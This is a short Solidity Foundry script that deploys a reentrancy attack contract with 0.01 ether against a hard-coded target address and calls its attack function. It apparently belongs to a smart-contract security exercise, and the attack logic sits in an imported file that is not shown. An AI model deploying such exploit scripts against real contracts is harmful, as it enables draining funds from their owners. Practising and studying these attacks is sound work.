//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "../src/ReentranceAttack.sol";

contract DeployReentranceAttacker is Script {
    ReentranceAttack reentranceAttackContract;

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);
        reentranceAttackContract = new ReentranceAttack{value: 0.01 ether}(
            0xCe5409Fd5a5Fc42d15F0C4B9c34d9D8349337148
        );
        reentranceAttackContract.attack();
        vm.stopBroadcast();
    }
}
